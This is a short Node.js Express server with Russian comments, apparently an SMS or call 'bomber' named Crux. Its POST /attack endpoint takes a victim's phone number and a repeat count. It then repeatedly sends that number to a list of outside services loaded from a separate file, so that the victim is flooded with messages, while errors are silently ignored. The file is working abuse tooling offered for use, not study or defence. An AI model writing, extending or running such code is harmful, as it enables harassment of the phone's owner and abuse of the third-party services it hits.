const express = require('express');
const cors = require('cors');
const axios = require('axios');
const services = require('./services.js'); // Проверь, что этот файл есть в GitHub!

const app = express();
app.use(cors());
app.use(express.json());

app.post('/attack', async (req, res) => {
    // ВАЖНО: берем phone и repeats из запроса
    const { phone, repeats } = req.body; 
    console.log(`🚀 Запуск на номер: ${phone}, повторов: ${repeats}`);

    res.status(200).json({ status: "started" });

    // Цикл теперь увидит переменную repeats
    for (let i = 0; i < (repeats || 1); i++) {
        for (const service of services) {
            try {
                const data = typeof service.data === 'function' ? service.data(phone) : service.data;
                await axios({
                    method: service.method,
                    url: service.url,
                    headers: service.headers,
                    data: data,
                    timeout: 4000
                });
            } catch (e) {
                // Игнорируем ошибки отдельных сервисов
            }
        }
        await new Promise(r => setTimeout(r, 1500));
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Сервер Crux ONLINE на порту ${PORT}`);
});
